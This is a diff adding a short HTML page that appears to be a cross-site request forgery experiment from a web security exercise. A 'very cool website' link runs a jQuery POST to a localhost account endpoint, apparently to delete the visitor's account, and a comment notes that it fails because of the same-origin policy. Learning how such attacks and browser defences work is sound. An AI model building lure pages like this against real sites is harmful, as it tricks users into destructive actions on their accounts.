@@ -1,0 +1,22 @@
+<!--Fails b/c of same-origin policy-->
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+      <script>
+        function delete_account(){
+          $.ajax({
+            method:'Post',
+            url: 'http://localhost:3000/account',
+            success:function (data){
+                document.write(data)
+            },
+            contentType:"application/json"
+          });
+        }
+      </script>
+  </head>
+  <body>
+  This is a very cool website <a href="#" onclick="delete_account()">Check it Out</a>
+  </body>
+</html>
